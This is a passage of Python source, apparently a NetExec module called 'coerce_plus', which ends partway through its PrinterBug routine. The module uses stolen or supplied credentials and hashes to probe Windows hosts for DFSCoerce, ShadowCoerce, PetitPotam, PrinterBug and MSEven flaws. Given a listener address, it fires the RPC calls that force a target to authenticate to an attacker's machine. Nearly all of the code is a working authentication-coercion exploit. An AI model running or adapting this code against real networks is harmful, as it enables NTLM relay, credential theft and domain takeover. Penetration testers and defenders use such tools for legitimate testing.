from impacket import uuid
from impacket.dcerpc.v5 import transport, rprn, even, epm
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

from impacket.uuid import uuidtup_to_bin


class NXCModule:
    name = "coerce_plus"
    description = "Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.listener = None
        self.always_continue = None
        self.method = "all"

    def options(self, context, module_options):
        """
        LISTENER       LISTENER for exploitation (default: 127.0.0.1)
        ALWAYS         Always continue to all exploit (default: False)
        METHOD         Exploit method (Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven, All   default: All)
        M              Alias for METHOD
        L              Alias for LISTENER
        """
        self.listener = None
        if "LISTENER" in module_options:
            self.listener = module_options["LISTENER"]
        if "L" in module_options:
            self.listener = module_options["L"]
        if "ALWAYS" in module_options:
            self.always_continue = True
        if "METHOD" in module_options:
            self.method = module_options["METHOD"].lower()
        if "M" in module_options:
            self.method = module_options["M"].lower()

    def on_login(self, context, connection):
        runmethod = False
        if self.method == "all" or self.method[:1] == "d":  # DFSCoerce
            runmethod = True
            """DFSCOERCE START"""
            try:
                dfscocerceclass = DFSCoerceTrigger(context)
                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                dfscocerceconnect = dfscocerceclass.connect(
                    username=connection.username,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    target=target,
                    doKerberos=connection.kerberos,
                    dcHost=connection.kdcHost,
                    aesKey=connection.aesKey,
                    pipe="netdfs"
                )

                if dfscocerceconnect is not None:
                    context.log.debug("Target is vulnerable to DFSCoerce")
                    context.log.highlight("VULNERABLE, DFSCoerce")
                    if self.listener is not None:  # exploit
                        dfscocerceclass.exploit(dfscocerceconnect, self.listener, self.always_continue, "netdfs")
                    dfscocerceconnect.disconnect()
                else:
                    context.log.debug("Target is not vulnerable to DFSCoerce")
            except Exception as e:
                context.log.error(f"Error in DFSCoerce module: {e}")
            """ DFSCOERCE END """

        if self.method == "all" or self.method[:1] == "s":  # ShadowCoerce
            runmethod = True
            """ ShadowCoerce START """
            try:
                shadowcocerceclass = ShadowCoerceTrigger(context)
                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                shadowcocerceconnect = shadowcocerceclass.connect(
                    username=connection.username,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    target=target,
                    doKerberos=connection.kerberos,
                    dcHost=connection.kdcHost,
                    aesKey=connection.aesKey,
                    pipe="Fssagentrpc"
                )

                if shadowcocerceconnect is not None:
                    context.log.debug("Target is vulnerable to ShadowCoerce")
                    context.log.highlight("VULNERABLE, ShadowCoerce")
                    if self.listener is not None:  # exploit
                        shadowcocerceclass.exploit(shadowcocerceconnect, self.listener, self.always_continue, "Fssagentrpc")
                    shadowcocerceconnect.disconnect()
                else:
                    context.log.debug("Target is not vulnerable to ShadowCoerce")
            except Exception as e:
                context.log.error(f"Error in ShadowCoerce module: {e}")
            """ ShadowCoerce END """

        if self.method == "all" or self.method[:2] == "pe":  # PetitPotam
            runmethod = True
            """ PETITPOTAM START """
            pipes = ["efsrpc", "lsarpc", "samr", "lsass", "netlogon"]
            reducelog = True
            for pipe in pipes:
                context.log.debug(f"Trying to connect to {pipe} pipe")
                try:
                    petitpotamclass = PetitPotamtTrigger(context)
                    target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                    petitpotamconnect = petitpotamclass.connect(
                        username=connection.username,
                        password=connection.password,
                        domain=connection.domain,
                        lmhash=connection.lmhash,
                        nthash=connection.nthash,
                        target=target,
                        doKerberos=connection.kerberos,
                        dcHost=connection.kdcHost,
                        aesKey=connection.aesKey,
                        pipe=pipe
                    )

                    if petitpotamconnect is not None:
                        if reducelog:
                            context.log.debug("Target is vulnerable to PetitPotam")
                            context.log.highlight("VULNERABLE, PetitPotam")
                            reducelog = False
                        if self.listener is not None:  # exploit TODO
                            exploit_status = petitpotamclass.exploit(petitpotamconnect, self.listener, self.always_continue, pipe)
                            if not self.always_continue and exploit_status:
                                break
                        petitpotamconnect.disconnect()
                    else:
                        context.log.debug("Target is not vulnerable to PetitPotam")
                except Exception as e:
                    context.log.error(f"Error in PetitPotam module: {e}")
            """ PETITPOTAM END """

        if self.method == "all" or self.method[:2] == "pr":  # PrinterBug
            runmethod = True
            """ PRINTERBUG START """
            pipes = ["spoolss", "[dcerpc]"]
            for pipe in pipes:
                try:
                    printerbugclass = PrinterBugTrigger(context)
                    target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                    printerbugconnect = printerbugclass.connect(
                        username=connection.username,
                        password=connection.password,
                        domain=connection.domain,
                        lmhash=connection.lmhash,
                        nthash=connection.nthash,
                        target=target,
                        doKerberos=connection.kerberos,
                        dcHost=connection.kdcHost,
                        aesKey=connection.aesKey,
                        pipe=pipe
                    )

                    if printerbugconnect is not None:
                        context.log.debug("Target is vulnerable to PrinterBug")
                        context.log.highlight("VULNERABLE, PrinterBug")
                        if self.listener is not None:  # exploit
                            exploit_status = printerbugclass.exploit(printerbugconnect, self.listener, target, self.always_continue, pipe)
                            if not self.always_continue and exploit_status:
                                break
                        printerbugconnect.disconnect()
                    else:
                        context.log.debug("Target is not vulnerable to PrinterBug")
                except Exception as e:
                    context.log.error(f"Error in PrinterBug module: {e}")
            """ PRINTERBUG END """

        if self.method == "all" or self.method[:1] == "m":  # MSEven
            runmethod = True
            """ MSEVEN START """
            try:
                msevenclass = MSEvenTrigger(context)
                target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
                msevenconnect = msevenclass.connect(
                    username=connection.username,
                    password=connection.password,
                    domain=connection.domain,
                    lmhash=connection.lmhash,
                    nthash=connection.nthash,
                    target=target,
                    doKerberos=connection.kerberos,
                    dcHost=connection.kdcHost,
                    aesKey=connection.aesKey,
                    pipe="eventlog"
                )

                if msevenconnect is not None:
                    context.log.debug("Target is vulnerable to MSEven")
                    context.log.highlight("VULNERABLE, MSEven")
                    if self.listener is not None:  # exploit
                        msevenclass.exploit(msevenconnect, self.listener, self.always_continue, "eventlog")
                    msevenconnect.disconnect()
                else:
                    context.log.debug("Target is not vulnerable to MSEven")
            except Exception as e:
                context.log.error(f"Error in MSEven module: {e}")
            """ MSEVEN END """
        if not runmethod:
            context.log.error("Invalid method, please check the method name.")
            return


class ShadowCoerceTrigger:
    def __init__(self, context):
        self.context = context

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "Fssagentrpc": {
                "stringBinding": r"ncacn_np:%s[\PIPE\Fssagentrpc]" % target,
                "MSRPC_UUID_FSRVP": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_FSRVP"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("[+] Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        self.context.log.debug("Sending IsPathShadowCopied!")
        try:
            request = IsPathShadowCopied()
            request["ShareName"] = f"{listener}\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("rpc_s_access_denied") >= 0:
                self.context.log.debug("IsPathShadowCopied Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\IsPathShadowCopied")
                if not always_continue:
                    return True
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending IsPathSupported!")
        try:
            request = IsPathSupported()
            request["ShareName"] = f"{listener}\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("rpc_s_access_denied") >= 0:
                self.context.log.debug("IsPathSupported Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\IsPathSupported")
                if not always_continue:
                    return True
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")


class NetrDfsAddStdRootForcedResponse(NDRCALL):
    structure = ()


class NetrDfsAddStdRootForced(NDRCALL):
    opnum = 15
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("RootShare", WSTR),  # Type: WCHAR *
        ("Comment", WSTR),  # Type: WCHAR *
        ("Share", WSTR),  # Type: WCHAR *
    )


class NetrDfsRemoveRootTargetResponse(NDRCALL):
    structure = ()


class NetrDfsRemoveRootTarget(NDRCALL):
    opnum = 24
    structure = (
        ("pDfsPath", LPWSTR),  # Type: LPWSTR
        ("pTargetPath", LPWSTR),  # Type: LPWSTR
        ("Flags", ULONG),  # Type: ULONG
    )


class NetrDfsAddRootTargetResponse(NDRCALL):
    structure = ()


class NetrDfsAddRootTarget(NDRCALL):
    opnum = 23
    structure = (
        ("pDfsPath", LPWSTR),  # Type: LPWSTR
        ("pTargetPath", LPWSTR),  # Type: LPWSTR
        ("MajorVersion", ULONG),  # Type: ULONG
        ("pComment", LPWSTR),  # Type: LPWSTR
        ("NewNamespace", BOOL),  # Type: BOOLEAN
        ("Flags", ULONG),  # Type: ULONG
    )


class DFSCoerceTrigger:
    def __init__(self, context):
        self.context = context

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "netdfs": {
                "stringBinding": r"ncacn_np:%s[\PIPE\netdfs]" % target,
                "MSRPC_UUID_DFSNM": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_DFSNM"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("[+] Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        self.context.log.debug("Sending NetrDfsAddStdRootForced!")
        try:
            request = NetrDfsAddStdRootForced()
            """ NET_API_STATUS NetrDfsAddStdRootForced(
                    [in, string] WCHAR* ServerName,
                    [in, string] WCHAR* RootShare,
                    [in, string] WCHAR* Comment,
                    [in, string] WCHAR* Share
                );
            """
            request["ServerName"] = f"{listener}\x00"
            request["RootShare"] = "test\x00"
            request["Comment"] = "lodos\x00"
            request["Share"] = "x:\\lodos2005\x00"

            dce.request(request)
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

        self.context.log.debug("Sending NetrDfsAddRootTarget!")
        try:
            request = NetrDfsAddRootTarget()
            """    NET_API_STATUS NetrDfsAddRootTarget(
                    [in, unique, string] LPWSTR pDfsPath,
                    [in, unique, string] LPWSTR pTargetPath,
                    [in] ULONG MajorVersion,
                    [in, unique, string] LPWSTR pComment,
                    [in] BOOLEAN NewNamespace,
                    [in] ULONG Flags
                );
            """
            request["pDfsPath"] = f"\\\\{listener}\\a\x00"
            request["pTargetPath"] = NULL
            request["MajorVersion"] = 0
            request["pComment"] = "lodos\x00"
            request["NewNamespace"] = 0
            request["Flags"] = 0
            dce.request(request)
            self.context.log.debug("NetrDfsAddRootTarget Success")
            return True
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

        # Private exploit
        self.context.log.debug("Sending NetrDfsRemoveRootTarget!")
        try:
            request = NetrDfsRemoveRootTarget()
            """    NET_API_STATUS NetrDfsRemoveRootTarget(
                    [in, unique, string] LPWSTR pDfsPath,
                    [in, unique, string] LPWSTR pTargetPath,
                    [in] ULONG Flags
                );
            """
            request["pDfsPath"] = f"\\\\{listener}\\a\x00"
            request["pTargetPath"] = NULL
            request["Flags"] = 0
            dce.request(request)
            self.context.log.debug("NetrDfsRemoveRootTarget Success")
            return True
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

        self.context.log.debug("Sending NetrDfsManagerInitialize!")
        try:
            request = NetrDfsManagerInitialize()
            """   NET_API_STATUS NetrDfsManagerInitialize(
                    [in, string] WCHAR* ServerName,
                    [in] DWORD Flags
                    );
            """
            request["ServerName"] = f"{listener}\x00"
            request["Flags"] = 0  # Flags: This parameter MUST be zero.

            dce.request(request)
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

        self.context.log.debug("Sending NetrDfsManagerInitialize!")
        try:
            request = NetrDfsManagerInitialize()
            """   NET_API_STATUS NetrDfsManagerInitialize(
                    [in, string] WCHAR* ServerName,
                    [in] DWORD Flags
                    );
            """
            request["ServerName"] = f"{listener}\x00"
            request["Flags"] = 0  # Flags: This parameter MUST be zero.

            dce.request(request)
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

        self.context.log.debug("Sending NetrDfsAddStdRoot!")
        try:
            request = NetrDfsAddStdRoot()
            request["ServerName"] = f"{listener}\x00"
            request["RootShare"] = "test\x00"
            request["Comment"] = "lodos\x00"
            request["ApiFlags"] = 0
            dce.request(request)
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

        self.context.log.debug("Sending NetrDfsRemoveStdRoot!")
        try:
            request = NetrDfsRemoveStdRoot()
            request["ServerName"] = f"{listener}\x00"
            request["RootShare"] = "test\x00"
            request["ApiFlags"] = 0
            dce.request(request)
        except Exception as e:
            self.handle_exception(request.__class__.__name__, always_continue, pipe, e)

    def handle_exception(self, method_name, always_continue, pipe, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.context.log.debug(f"{method_name} Success")
            self.context.log.highlight(f"Exploit Success, {pipe}\\{method_name}")
            if not always_continue:
                return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.context.log.debug("Not Vulnerable")
        else:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")


class PetitPotamtTrigger:
    def __init__(self, context):
        self.context = context

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "lsarpc": {
                "stringBinding": r"ncacn_np:%s[\PIPE\lsarpc]" % target,
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "efsrpc": {
                "stringBinding": r"ncacn_np:%s[\PIPE\efsrpc]" % target,
                "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
            },
            "samr": {
                "stringBinding": r"ncacn_np:%s[\PIPE\samr]" % target,
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "lsass": {
                "stringBinding": r"ncacn_np:%s[\PIPE\lsass]" % target,
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
            "netlogon": {
                "stringBinding": r"ncacn_np:%s[\PIPE\netlogon]" % target,
                "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
            },
        }

        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        rpctransport.set_dport(445)

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EFSR"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("Successfully bound!")
        return dce

    def exploit(self, dce, listener, always_continue, pipe):
        self.context.log.debug("Sending EfsRpcAddUsersToFile!")
        try:
            request = EfsRpcAddUsersToFile()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcAddUsersToFile Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcAddUsersToFile")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcAddUsersToFileEx!")
        try:
            request = EfsRpcAddUsersToFileEx()
            request["dwFlags"] = 0x00000002
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcAddUsersToFileEx Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcAddUsersToFileEx")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcDecryptFileSrv!")
        try:
            request = EfsRpcDecryptFileSrv()
            request["OpenFlag"] = 0
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcDecryptFileSrv Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcDecryptFileSrv")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcDuplicateEncryptionInfoFile!")
        try:
            request = EfsRpcDuplicateEncryptionInfoFile()
            request["SrcFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            request["DestFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            request["dwCreationDisposition"] = 0
            request["dwAttributes"] = 0
            request["RelativeSD"] = EFS_RPC_BLOB()
            request["bInheritHandle"] = 0
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcDuplicateEncryptionInfoFile Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcDuplicateEncryptionInfoFile")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcEncryptFileSrv!")
        try:
            request = EfsRpcEncryptFileSrv()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcEncryptFileSrv Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcEncryptFileSrv")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcEncryptFileSrv!")
        try:
            request = EfsRpcEncryptFileSrv()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcEncryptFileSrv Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcEncryptFileSrv")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcFileKeyInfo!")
        try:
            request = EfsRpcFileKeyInfo()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            request["InfoClass"] = 0
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcFileKeyInfo Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcFileKeyInfo")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcQueryRecoveryAgents!")
        try:
            request = EfsRpcQueryRecoveryAgents()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcQueryRecoveryAgents Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcQueryRecoveryAgents")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcQueryUsersOnFile!")
        try:
            request = EfsRpcQueryUsersOnFile()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcQueryUsersOnFile Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcQueryUsersOnFile")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcRemoveUsersFromFile!")
        try:
            request = EfsRpcRemoveUsersFromFile()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcRemoveUsersFromFile Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcRemoveUsersFromFile")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending EfsRpcOpenFileRaw!")
        try:
            request = EfsRpcOpenFileRaw()
            request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
            request["Flags"] = 0
            dce.request(request)
        except Exception as e:
            if str(e).find("ERROR_BAD_NETPATH") >= 0:
                self.context.log.debug("EfsRpcOpenFileRaw Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\EfsRpcOpenFileRaw")
                if not always_continue:
                    return True
            elif str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_INVALID_NAME") >= 0:
                self.context.log.debug("Not Vulnerable")
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")
        return False


class PrinterBugTrigger:
    def __init__(self, context):
        self.context = context

    def get_dynamic_endpoint(self, interface: bytes, target: str, timeout: int = 5) -> str:
        string_binding = r"ncacn_ip_tcp:%s[135]" % target
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_connect_timeout(timeout)
        dce = rpctransport.get_dce_rpc()
        self.context.log.debug(
            "Trying to resolve dynamic endpoint %s" % repr(uuid.bin_to_string(interface))
        )
        try:
            dce.connect()
        except Exception as e:
            self.context.log.warning("Failed to connect to endpoint mapper: %s" % e)
            raise e
        try:
            endpoint = epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
            self.context.log.debug(
                f"Resolved dynamic endpoint {uuid.bin_to_string(interface)!r} to {endpoint!r}"
            )
            return endpoint
        except Exception as e:
            self.context.log.debug(
                "Failed to resolve dynamic endpoint %s"
                % repr(uuid.bin_to_string(interface))
            )
            raise e


    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        binding_params = {
            "spoolss": {
                "stringBinding": r"ncacn_np:%s[\PIPE\spoolss]" % target,
                "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                "port": 445
            },
            "[dcerpc]": {
                "stringBinding": self.get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target),
                "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                "port": None
            }
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
        if binding_params[pipe]["port"] is not None:
            rpctransport.set_dport(binding_params[pipe]["port"])

        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        rpctransport.setRemoteHost(target)
        dce = rpctransport.get_dce_rpc()
        if doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {format(binding_params[pipe]['stringBinding'])}")
        try:
            dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_RPRN"]))
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return None
        self.context.log.debug("Successfully bound!")
        return dce

    def exploit(self, dce, listener, target, always_continue, pipe):
        try:
            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
        except Exception as e:
            if str(e).find("Broken pipe") >= 0:
                # The connection timed-out. Let's try to bring it back next round
                self.context.log.debug("Connection failed - skipping host!")
                return None
            elif str(e).upper().find("ACCESS_DENIED"):
                # We're not admin, bye
                self.context.log.debug("Access denied - RPC call was denied")
                return None
        self.context.log.debug("Got Handle")
        self.context.log.debug("Sending RpcRemoteFindFirstPrinterChangeNotificationEx!")

        try:
            # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request["hPrinter"] = resp["pHandle"]
            request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
            request["pszLocalMachine"] = "\\\\%s\x00" % listener
            request["fdwOptions"] = 0x00000000
            request["dwPrinterLocal"] = 0
            dce.request(request)
        except Exception as e:
            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
                self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotificationEx Success")
                self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
                if not always_continue:
                    return True
            else:
                self.context.log.debug(f"Something went wrong, check error status => {e!s}")

        self.context.log.debug("Sending RpcRemoteFindFirstPrinterChangeNotification!")
        try:
            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
        except Exception as e:
